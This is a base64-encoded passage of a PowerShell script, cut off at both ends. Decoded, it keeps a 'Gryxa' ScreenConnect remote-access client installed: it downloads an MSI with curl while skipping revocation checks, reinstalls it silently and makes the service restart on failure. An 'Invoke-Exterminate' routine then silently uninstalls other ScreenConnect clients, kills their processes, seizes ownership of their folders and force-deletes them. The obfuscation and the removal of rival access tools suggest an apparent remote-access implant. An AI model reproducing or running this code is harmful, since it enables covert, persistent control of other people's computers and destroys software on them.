aSAocGFuZWwgZHVwbGljYXRlcykuCiAgICAjIFJlaW5zdGFsbCBvbmx5IHdoZW46IG5vdCBydW5u
aW5nL21pc3NpbmcsIE9SIE1TSSBGUCBkcmlmdGVkIGZyb20gaW5zdGFsbGVkIEZQLCBPUiAtRm9y
Y2UuCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkV29ya0RpcikpIHsKICAg
ICAgICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRXb3JrRGlyIC1Gb3JjZSB8
IE91dC1OdWxsCiAgICB9CiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9lbnN1
cmUubG9nJwogICAgZnVuY3Rpb24gR0xvZyhbc3RyaW5nXSRtKSB7CiAgICAgICAgJGxpbmUgPSAn
ezB9IHsxfScgLWYgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0K
ICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgJGxpbmUgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KCiAgICAkb2xkRnAgPSBHZXQtR3J5eGFGcAog
ICAgJGRvRGVlcCA9IFtib29sXSgkRGVlcCAtb3IgJEZvcmNlIC1vciAoJEV4dHJhIC1tYXRjaCAn
KD9pKWRlZXB8Zm9yY2UnKSkKICAgIEdMb2cgImdyeXhhX2Vuc3VyZV9iZWdpbiBkZWVwPSRkb0Rl
ZXAgZm9yY2U9JEZvcmNlIG9sZF9mcD0kb2xkRnAiCgogICAgIyBTeW5jIGNmZyB0byB3aGF0ZXZl
ciBHcnl4YS1saWtlIGNsaWVudCBpcyBhbHJlYWR5IFJ1bm5pbmcKICAgICRydW5uaW5nRnAgPSBG
aW5kLVJ1bm5pbmdHcnl4YUZwCiAgICBpZiAoJHJ1bm5pbmdGcCkgewogICAgICAgIFNldC1Hcnl4
YUZwICRydW5uaW5nRnAKICAgICAgICAkb2xkRnAgPSAkcnVubmluZ0ZwCiAgICAgICAgR0xvZyAi
YWxyZWFkeV9ydW5uaW5nX2ZwPSRydW5uaW5nRnAiCiAgICAgICAgaWYgKC1ub3QgJEZvcmNlIC1h
bmQgLW5vdCAkZG9EZWVwKSB7CiAgICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ0Zw
fHJ1bm5pbmc9MXxza2lwLXJlaW5zdGFsbCIKICAgICAgICB9CiAgICB9CgogICAgaWYgKC1ub3Qg
JGRvRGVlcCAtYW5kIC1ub3QgJEZvcmNlKSB7CiAgICAgICAgIyBMaWdodDogc3RhcnQvcmVwYWly
IG9ubHkg4oCUIG5ldmVyIG1zaWV4ZWMgL2kgaWYgd2UgY2FuIGdldCBSdW5uaW5nCiAgICAgICAg
aWYgKFRlc3QtU2NSdW5uaW5nICRvbGRGcCkgewogICAgICAgICAgICByZXR1cm4gIkhFQUxUSFl8
JG9sZEZwfHJ1bm5pbmc9MSIKICAgICAgICB9CiAgICAgICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCRvbGRGcCkiCiAgICAgICAgJiBzYy5leGUgY29uZmlnICRuYW1lIHN0YXJ0PSBh
dXRvIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICYgc2MuZXhlIHN0YXJ0ICRuYW1lIDI+JjEgfCBP
dXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDQKICAgICAgICBpZiAoVGVzdC1T
Y1J1bm5pbmcgJG9sZEZwKSB7CiAgICAgICAgICAgIEdMb2cgJ2xpZ2h0X3N0YXJ0ZWRfb2snCiAg
ICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwkb2xkRnB8c3RhcnRlZD0xIgogICAgICAgIH0KICAg
ICAgICBpZiAoRmluZC1Qcm9kdWN0R3VpZCAkb2xkRnApIHsKICAgICAgICAgICAgJHJlcCA9IFJl
cGFpci1TQ1NlcnZpY2UgJG9sZEZwCiAgICAgICAgICAgIEdMb2cgImxpZ2h0X3JlcGFpcj0kcmVw
IgogICAgICAgICAgICBpZiAoVGVzdC1TY1J1bm5pbmcgJG9sZEZwKSB7IHJldHVybiAiSEVBTFRI
WXwkb2xkRnB8cmVwYWlyZWQ9MSIgfQogICAgICAgIH0KICAgICAgICAjIFN0aWxsIG5vdCBydW5u
aW5nIOKGkiBlc2NhbGF0ZSB0byBpbnN0YWxsIChub3QgL3ggb2YgYSBydW5uaW5nIHBlZXIpCiAg
ICAgICAgR0xvZyAnbGlnaHRfZXNjYWxhdGVfaW5zdGFsbF9taXNzaW5nJwogICAgICAgICRkb0Rl
ZXAgPSAkdHJ1ZQogICAgfQoKICAgICMgRGVlcCBwYXRoOiBmZXRjaCBNU0kgZm9yIEZQIGNvbXBh
cmlzb247IHJlaW5zdGFsbCBvbmx5IGlmIG5lZWRlZAogICAgJG1zaSA9IEpvaW4tUGF0aCAkV29y
a0RpciAncGtnX2dyeXhhLm1zaScKICAgICR0bXAgPSBKb2luLVBhdGggJGVudjpURU1QICgic2Nf
Z3J5eGFfezB9Lm1zaSIgLWYgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkKICAgICRm
ZXRjaGVkID0gJGZhbHNlCiAgICB0cnkgewogICAgICAgICRjdXJsID0gSm9pbi1QYXRoICRlbnY6
U3lzdGVtUm9vdCAnU3lzdGVtMzJcY3VybC5leGUnCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0
aCAkY3VybCkpIHsgJGN1cmwgPSAnY3VybC5leGUnIH0KICAgICAgICAmICRjdXJsIC1MIC0tc3Ns
LW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAtbyAkdG1wICRz
Y3JpcHQ6R3J5eGFNc2lVcmwgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgaWYgKChUZXN0LVBhdGgg
JHRtcCkgLWFuZCAoKEdldC1JdGVtICR0bXApLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsKICAgICAg
ICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1EZXN0aW5hdGlvbiAkbXNpIC1Gb3Jj
ZQogICAgICAgICAgICAkZmV0Y2hlZCA9ICR0cnVlCiAgICAgICAgICAgIEdMb2cgKCJtc2lfZmV0
Y2hlZCBieXRlcz17MH0iIC1mIChHZXQtSXRlbSAkbXNpKS5MZW5ndGgpCiAgICAgICAgfQogICAg
fSBjYXRjaCB7CiAgICAgICAgR0xvZyAibXNpX2ZldGNoX2Vycj0kXyIKICAgIH0gZmluYWxseSB7
CiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLUZvcmNlIC1FcnJvckFjdGlv
biBTaWxlbnRseUNvbnRpbnVlCiAgICB9CiAgICBpZiAoLW5vdCAkZmV0Y2hlZCAtYW5kIChUZXN0
LVBhdGggJG1zaSkgLWFuZCAoKEdldC1JdGVtICRtc2kpLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsK
ICAgICAgICAkZmV0Y2hlZCA9ICR0cnVlCiAgICAgICAgR0xvZyAnbXNpX3VzaW5nX2NhY2hlJwog
ICAgfQoKICAgICRuZXdGcCA9ICRudWxsCiAgICBpZiAoJGZldGNoZWQpIHsKICAgICAgICAkcHJv
ZE5hbWUgPSBHZXQtTXNpUHJvcGVydHkgJG1zaSAnUHJvZHVjdE5hbWUnCiAgICAgICAgJG5ld0Zw
ID0gR2V0LUZwRnJvbVByb2R1Y3ROYW1lICRwcm9kTmFtZQogICAgICAgIEdMb2cgIm1zaV9mcD0k
bmV3RnAgcHJvZHVjdD0kcHJvZE5hbWUiCiAgICB9CgogICAgIyBSZS1jaGVjayBydW5uaW5nIGFm
dGVyIGZldGNoIChsb25nIGRvd25sb2FkKQogICAgJHJ1bm5pbmdGcCA9IEZpbmQtUnVubmluZ0dy
eXhhRnAKICAgICRmcERyaWZ0ID0gJGZhbHNlCiAgICBpZiAoJG5ld0ZwIC1hbmQgJHJ1bm5pbmdG
cCAtYW5kICgkbmV3RnAgLW5lICRydW5uaW5nRnApKSB7CiAgICAgICAgJGZwRHJpZnQgPSAkdHJ1
ZQogICAgICAgIEdMb2cgImZwX2RyaWZ0IHJ1bm5pbmc9JHJ1bm5pbmdGcCBtc2k9JG5ld0ZwIgog
ICAgfSBlbHNlaWYgKCRuZXdGcCAtYW5kIC1ub3QgJHJ1bm5pbmdGcCAtYW5kICRvbGRGcCAtYW5k
ICgkbmV3RnAgLW5lICRvbGRGcCkgLWFuZCAoRmluZC1Qcm9kdWN0R3VpZCAkb2xkRnAgLW9yIFRl
c3QtU2NEaXIgJG9sZEZwKSkgewogICAgICAgICRmcERyaWZ0ID0gJHRydWUKICAgICAgICBHTG9n
ICJmcF9kcmlmdCBpbnN0YWxsZWQ9JG9sZEZwIG1zaT0kbmV3RnAiCiAgICB9CgogICAgIyBIQVJE
OiBSdW5uaW5nICsgc2FtZSBGUCAob3Igbm8gZHJpZnQpICsgbm90IEZvcmNlIOKGkiBuZXZlciBy
ZWluc3RhbGwKICAgIGlmICgkcnVubmluZ0ZwIC1hbmQgLW5vdCAkRm9yY2UgLWFuZCAtbm90ICRm
cERyaWZ0KSB7CiAgICAgICAgU2V0LUdyeXhhRnAgJHJ1bm5pbmdGcAogICAgICAgICR0Y3BSZWxh
eSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4YVJlbGF5SG9zdCA0NDMKICAgICAgICAk
dGNwVWkgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6R3J5eGFVaUhvc3QgNDQzCiAgICAgICAg
R0xvZyAiZGVlcF9za2lwX3JlaW5zdGFsbF9hbHJlYWR5X3J1bm5pbmcgcmVsYXk9JHRjcFJlbGF5
IHVpPSR0Y3BVaSIKICAgICAgICByZXR1cm4gIkhFQUxUSFl8JHJ1bm5pbmdGcHxydW5uaW5nPTF8
cmVsYXk9JHRjcFJlbGF5fHVpPSR0Y3BVaXxza2lwLXJlaW5zdGFsbCIKICAgIH0KCiAgICBpZiAo
LW5vdCAkZmV0Y2hlZCAtb3IgLW5vdCAkbmV3RnApIHsKICAgICAgICBpZiAoJHJ1bm5pbmdGcCkg
ewogICAgICAgICAgICBTZXQtR3J5eGFGcCAkcnVubmluZ0ZwCiAgICAgICAgICAgIHJldHVybiAi
SEVBTFRIWXwkcnVubmluZ0ZwfHJ1bm5pbmc9MXxtc2ktZmV0Y2gtc29mdGZhaWwiCiAgICAgICAg
fQogICAgICAgIEdMb2cgJ21zaV9mZXRjaF9GQUlMJwogICAgICAgIHJldHVybiAiVU5IRUFMVEhZ
fCRvbGRGcHxtc2ktZmV0Y2gtZmFpbCIKICAgIH0KCiAgICAkbmVlZFJlaW5zdGFsbCA9IFtib29s
XSRGb3JjZSAtb3IgJGZwRHJpZnQgLW9yICgtbm90ICRydW5uaW5nRnApCiAgICBpZiAoJG5lZWRS
ZWluc3RhbGwgLWFuZCAtbm90ICRGb3JjZSAtYW5kIC1ub3QgJGZwRHJpZnQgLWFuZCAtbm90IChU
ZXN0LUdyeXhhUmVpbnN0YWxsQWxsb3dlZCkpIHsKICAgICAgICBHTG9nICdyZWluc3RhbGxfcmF0
ZV9saW1pdGVkJwogICAgICAgIGlmICgkcnVubmluZ0ZwKSB7IHJldHVybiAiSEVBTFRIWXwkcnVu
bmluZ0ZwfHJ1bm5pbmc9MXxyYXRlLWxpbWl0ZWQiIH0KICAgICAgICByZXR1cm4gIlVOSEVBTFRI
WXwkb2xkRnB8cmF0ZS1saW1pdGVkIgogICAgfQoKICAgIGlmICgtbm90ICRuZWVkUmVpbnN0YWxs
KSB7CiAgICAgICAgU2V0LUdyeXhhRnAgJG5ld0ZwCiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRu
ZXdGcHxuby1yZWluc3RhbGwtbmVlZGVkIgogICAgfQoKICAgIEdMb2cgInJlaW5zdGFsbF9iZWdp
biBmb3JjZT0kRm9yY2UgZHJpZnQ9JGZwRHJpZnQgcnVubmluZz0kcnVubmluZ0ZwIgogICAgTWFy
ay1Hcnl4YVJlaW5zdGFsbAoKICAgICMgT25seSB1bmluc3RhbGwgaWYgRlAgY2hhbmdpbmcgb3Ig
Rm9yY2U7IGlmIG1pc3NpbmcgaW5zdGFsbCwganVzdCAvaQogICAgaWYgKCRmcERyaWZ0IC1vciAk
Rm9yY2UpIHsKICAgICAgICBpZiAoJHJ1bm5pbmdGcCAtYW5kICRydW5uaW5nRnAgLW5lICRuZXdG
cCkgewogICAgICAgICAgICBHTG9nICJ1bmluc3RhbGxfb2xkX3J1bm5pbmc9JHJ1bm5pbmdGcCIK
ICAgICAgICAgICAgVW5pbnN0YWxsLVNjRmluZ2VycHJpbnQgJHJ1bm5pbmdGcCB8IE91dC1OdWxs
CiAgICAgICAgfQogICAgICAgIGlmICgkb2xkRnAgLWFuZCAkb2xkRnAgLW5lICRuZXdGcCAtYW5k
ICRvbGRGcCAtbmUgJHJ1bm5pbmdGcCkgewogICAgICAgICAgICBHTG9nICJ1bmluc3RhbGxfb2xk
X2NmZz0kb2xkRnAiCiAgICAgICAgICAgIFVuaW5zdGFsbC1TY0ZpbmdlcnByaW50ICRvbGRGcCB8
IE91dC1OdWxsCiAgICAgICAgfQogICAgICAgIGlmICgkRm9yY2UgLWFuZCAoRmluZC1Qcm9kdWN0
R3VpZCAkbmV3RnApKSB7CiAgICAgICAgICAgIEdMb2cgImZvcmNlX3VuaW5zdGFsbF9zYW1lX2Zw
PSRuZXdGcCIKICAgICAgICAgICAgVW5pbnN0YWxsLVNjRmluZ2VycHJpbnQgJG5ld0ZwIHwgT3V0
LU51bGwKICAgICAgICB9CiAgICB9IGVsc2VpZiAoLW5vdCAoRmluZC1Qcm9kdWN0R3VpZCAkbmV3
RnApKSB7CiAgICAgICAgR0xvZyAiZnJlc2hfaW5zdGFsbF9mcD0kbmV3RnAiCiAgICB9IGVsc2Ug
ewogICAgICAgICMgUHJvZHVjdCByZWdpc3RlcmVkIGJ1dCBzZXJ2aWNlIG5vdCBydW5uaW5nIOKG
kiAvZmEgZmlyc3QsIG5vdCAveCsvaQogICAgICAgIEdMb2cgInJlZ2lzdGVyZWRfbm90X3J1bm5p
bmdfcmVwYWlyPSRuZXdGcCIKICAgICAgICBSZXBhaXItU0NTZXJ2aWNlICRuZXdGcCB8IE91dC1O
dWxsCiAgICAgICAgaWYgKFRlc3QtU2NSdW5uaW5nICRuZXdGcCkgewogICAgICAgICAgICBTZXQt
R3J5eGFGcCAkbmV3RnAKICAgICAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRuZXdGcHxyZXBhaXJl
ZD0xIgogICAgICAgIH0KICAgICAgICAjIExhc3QgcmVzb3J0OiBjbGVhbiByZWluc3RhbGwgb2Yg
c2FtZSBGUCAocmF0ZS1saW1pdGVkIGFib3ZlKQogICAgICAgIEdMb2cgInJlcGFpcl9mYWlsZWRf
Y2xlYW5fcmVpbnN0YWxsPSRuZXdGcCIKICAgICAgICBVbmluc3RhbGwtU2NGaW5nZXJwcmludCAk
bmV3RnAgfCBPdXQtTnVsbAogICAgfQoKICAgIFNldC1Hcnl4YUZwICRuZXdGcAogICAgJGV4aXQg
PSBJbnN0YWxsLUdyeXhhRnJvbU1zaSAkbXNpCiAgICBHTG9nICJtc2lleGVjX2V4aXQ9JGV4aXQi
CgogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRuZXdGcCkiCiAgICAmIHNjLmV4
ZSBjb25maWcgJG5hbWUgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsCiAgICAmIHNjLmV4ZSBm
YWlsdXJlICRuYW1lIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMwMDAvcmVzdGFydC8z
MDAwL3Jlc3RhcnQvMzAwMCAyPiYxIHwgT3V0LU51bGwKICAgICYgc2MuZXhlIHN0YXJ0ICRuYW1l
IDI+JjEgfCBPdXQtTnVsbAogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNQogICAgJiBzYy5leGUg
c3RhcnQgJG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1Cgog
ICAgZm9yZWFjaCAoJGtmcCBpbiAkc2NyaXB0OlNldnJ6S2VlcCkgewogICAgICAgICRrbiA9ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJGtmcCkiCiAgICAgICAgJiBzYy5leGUgc3RhcnQgJGtuIDI+
JjEgfCBPdXQtTnVsbAogICAgICAgIGlmICgtbm90IChHZXQtU2VydmljZSAtTmFtZSAka24gLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAgICAgICAgICAgIFJlcGFpci1TQ1NlcnZp
Y2UgJGtmcCB8IE91dC1OdWxsCiAgICAgICAgfQogICAgfQoKICAgIGlmICgtbm90IChUZXN0LVNj
UnVubmluZyAkbmV3RnApKSB7CiAgICAgICAgUmVwYWlyLVNDU2VydmljZSAkbmV3RnAgfCBPdXQt
TnVsbAogICAgfQoKICAgIGlmIChUZXN0LVNjUnVubmluZyAkbmV3RnApIHsKICAgICAgICBHTG9n
ICJwb3N0X3J1bm5pbmdfb2siCiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRuZXdGcHxyZWluc3Rh
bGxlZD0xIgogICAgfQogICAgR0xvZyAncG9zdF9zdGlsbF9kb3duJwogICAgcmV0dXJuICJVTkhF
QUxUSFl8JG5ld0ZwfHN0aWxsLW5vdC1ydW5uaW5nIgp9CgpmdW5jdGlvbiBJbnZva2UtRXh0ZXJt
aW5hdGUgewogICAgIyBMNzogdHJ1ZSByZW1vdmFsLiBDb3JyZWN0IFdPVzY0MzJOb2RlIGhpdmUg
KyBtc2lleGVjICsgVW5pbnN0YWxsU3RyaW5nCiAgICAjIGZhbGxiYWNrICsgZm9yY2UgZGlyIG51
a2UuIEtlZXAgc2V2cnorYWx0K2N1cnJlbnQgZ3J5eGEgRlAgKGdyeXhhLmNmZykuCiAgICAkbG9n
ID0gSm9pbi1QYXRoICRXb3JrRGlyICdleHRlcm1pbmF0ZS5sb2cnCiAgICAka2VlcCA9IEAoR2V0
LUtlZXBGaW5nZXJwcmludHMpCiAgICAkbiA9IEB7IHN2YyA9IDA7IHByb2MgPSAwOyBkaXIgPSAw
OyBwcm9kdWN0ID0gMDsgcm1tID0gMDsgZmFpbCA9IDAgfQogICAgZnVuY3Rpb24gTG9nKFtzdHJp
bmddJG0pIHsKICAgICAgICAkbGluZSA9ICd7MH0gezF9JyAtZiAoR2V0LURhdGUgLUZvcm1hdCAn
eXl5eS1NTS1kZCBISDptbTpzcycpLCAkbQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0
aCAkbG9nIC1WYWx1ZSAkbGluZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAg
IFdyaXRlLU91dHB1dCAkbGluZQogICAgfQogICAgZnVuY3Rpb24gSXMtS2VlcGVyKFtzdHJpbmdd
JHMpIHsKICAgICAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJGZhbHNlIH0KICAgICAgICBmb3Jl
YWNoICgkayBpbiAka2VlcCkgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1ZSB9
IH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9CiAgICBmdW5jdGlvbiBGb3JjZS1SZW1vdmVE
aXIoW3N0cmluZ10kZCkgewogICAgICAgIGlmICgtbm90ICRkIC1vciAtbm90IChUZXN0LVBhdGgg
LUxpdGVyYWxQYXRoICRkKSkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIEdldC1DaW1JbnN0YW5j
ZSBXaW4zMl9Qcm9jZXNzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwKICAgICAgICAg
ICAgV2hlcmUtT2JqZWN0IHsgJF8uRXhlY3V0YWJsZVBhdGggLWFuZCAkXy5FeGVjdXRhYmxlUGF0
aC5TdGFydHNXaXRoKCRkLCBbU3RyaW5nQ29tcGFyaXNvbl06Ok9yZGluYWxJZ25vcmVDYXNlKSB9
IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nl
c3NJZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQogICAgICAgICYgdGFr
ZW93bi5leGUgL0YgJGQgL1IgL0QgWSAyPiYxIHwgT3V0LU51bGwKICAgICAgICAmIGljYWNscy5l
eGUgJGQgL2dyYW50ICcqUy0xLTUtMzItNTQ0OkYnIC9UIC9DIC9RIDI+JjEgfCBPdXQtTnVsbAog
ICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0FkbWluaXN0cmF0b3JzOkYnIC9UIC9DIC9R
IDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVj
dXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICBpZiAoVGVz
dC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkgewogICAgICAgICAgICBjbWQuZXhlIC9jICJhdHRyaWIg
LWggLXMgLXIgL3MgL2QgYCIkZFwqLipgIiIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgIGNt
ZC5leGUgL2MgInJtZGlyIC9zIC9xIGAiJGRgIiIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgfQog
ICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7CiAgICAgICAgICAgICRlbXB0
eSA9IEpvaW4tUGF0aCAkZW52OlRFTVAgKCJvd25fZW1wdHlfIiArIFtndWlkXTo6TmV3R3VpZCgp
LlRvU3RyaW5nKCdOJykpCiAgICAgICAgICAgIE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3Rvcnkg
LVBhdGggJGVtcHR5IC1Gb3JjZSB8IE91dC1OdWxsCiAgICAgICAgICAgICYgcm9ib2NvcHkuZXhl
ICRlbXB0eSAkZCAvTUlSIC9SOjAgL1c6MCAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgUmVt
b3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRlbXB0eSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUKICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNl
IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIH0KICAgICAgICBy
ZXR1cm4gLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkKICAgIH0KICAgIGZ1bmN0aW9u
IFVuaW5zdGFsbC1Qcm9kdWN0S2V5KCRrZXkpIHsKICAgICAgICAkZ3VpZCA9ICRrZXkuUFNDaGls
ZE5hbWUKICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAkZG4gPSAkcHJvcC5EaXNwbGF5TmFtZQog
ICAgICAgIGlmICgkZ3VpZCAtbGlrZSAneyp9JykgewogICAgICAgICAgICAkcCA9IFN0YXJ0LVBy
b2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL3ggJGd1aWQgL3FuIC9ub3Jlc3RhcnQg
UkVCT09UPVJlYWxseVN1cHByZXNzIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRl
bgogICAgICAgICAgICBMb2cgInByb2R1Y3RfbXNpZXhlYyBbJGRuXSBndWlkPSRndWlkIGV4aXQ9
JCgkcC5FeGl0Q29kZSkiCiAgICAgICAgICAgIGlmICgkcC5FeGl0Q29kZSAtaW4gMCwgMTYwNSwg
MTYxNCwgMzAxMCkgeyByZXR1cm4gJHRydWUgfQogICAgICAgIH0KICAgICAgICAkdXMgPSAkcHJv
cC5Vbmluc3RhbGxTdHJpbmcKICAgICAgICBpZiAoJHVzKSB7CiAgICAgICAgICAgIHRyeSB7CiAg
ICAgICAgICAgICAgICBpZiAoJHVzIC1tYXRjaCAnKD9pKW1zaWV4ZWMnKSB7CiAgICAgICAgICAg
ICAgICAgICAgJGFyZ3MgPSAoJHVzIC1yZXBsYWNlICcoP2kpXi4qbXNpZXhlYyhcLmV4ZSk/XHMq
JywgJycpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRhcmdzIC1ub3RtYXRjaCAnL3FuJykgeyAk
YXJncyA9ICIkYXJncyAvcW4gL25vcmVzdGFydCIgfQogICAgICAgICAgICAgICAgICAgICRwID0g
U3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICRhcmdzIC1XYWl0IC1QYXNz
VGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgICAgICAgICAgICAgTG9nICJwcm9kdWN0
X3VuaW5zdGFsbHN0cmluZ19tc2kgWyRkbl0gZXhpdD0kKCRwLkV4aXRDb2RlKSIKICAgICAgICAg
ICAgICAgICAgICByZXR1cm4gKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEwKQog
ICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkcCA9IFN0YXJ0LVBy
b2Nlc3MgY21kLmV4ZSAtQXJndW1lbnRMaXN0ICIvYyAkdXMgL1MgL3NpbGVudCAvcXVpZXQgL3Fu
IiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgICAgICAgICAgICAgICAg
IExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdfZXhlIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29k
ZSkiCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkcC5FeGl0Q29kZSAtZXEgMCkKICAgICAg
ICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaCB7IExvZyAicHJvZHVjdF91bmluc3RhbGxz
dHJpbmdfRkFJTCBbJGRuXSAkXyIgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJGZhbHNlCiAg
ICB9CgogICAgTG9nICdleHRlcm1pbmF0ZV9lbmdpbmVfTDdfYmVnaW4nCgogICAgIyAxLiBmb3Jl
aWduIFNDIHByb2R1Y3RzIGZyb20gQk9USCBjb3JyZWN0IEFSUCBoaXZlcwogICAgJHNlZW4gPSBA
e30KICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAg
ICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBMb2cgImhpdmVfbWlzc2luZyAkcm9vdCI7
IGNvbnRpbnVlIH0KICAgICAgICBMb2cgImhpdmVfc2NhbiAkcm9vdCIKICAgICAgICBHZXQtQ2hp
bGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmpl
Y3QgewogICAgICAgICAgICAkcHJvcCA9IEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICRkbiA9ICRwcm9wLkRpc3BsYXlO
YW1lCiAgICAgICAgICAgIGlmICgtbm90ICRkbikgeyByZXR1cm4gfQogICAgICAgICAgICBpZiAo
JGRuIC1ub3RtYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RccytDbGllbnRccypcKChbMC05QS1GYS1m
XXsxNn0pXCknKSB7IHJldHVybiB9CiAgICAgICAgICAgICRmcCA9ICRNYXRjaGVzWzFdLlRvTG93
ZXIoKQogICAgICAgICAgICBpZiAoJGZwIC1pbiAka2VlcCkgeyByZXR1cm4gfQogICAgICAgICAg
ICBpZiAoJHNlZW4uQ29udGFpbnNLZXkoJF8uUFNDaGlsZE5hbWUpKSB7IHJldHVybiB9CiAgICAg
ICAgICAgICRzZWVuWyRfLlBTQ2hpbGROYW1lXSA9ICR0cnVlCiAgICAgICAgICAgIGlmIChVbmlu
c3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5wcm9kdWN0KysgfSBlbHNlIHsgJG4uZmFpbCsrOyBM
b2cgInByb2R1Y3RfUkVNT1ZFX0ZBSUxFRCBbJGRuXSIgfQogICAgICAgIH0KICAgIH0KCiAgICAj
IDIuIGZvcmVpZ24gU0Mgc2VydmljZXMKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNl
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAt
bGlrZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9KSkgewogICAgICAgIGlmIChJcy1LZWVwZXIg
JHN2Yy5OYW1lKSB7IGNvbnRpbnVlIH0KICAgICAgICAmIHNjLmV4ZSBzdG9wICIkKCRzdmMuTmFt
ZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNjAw
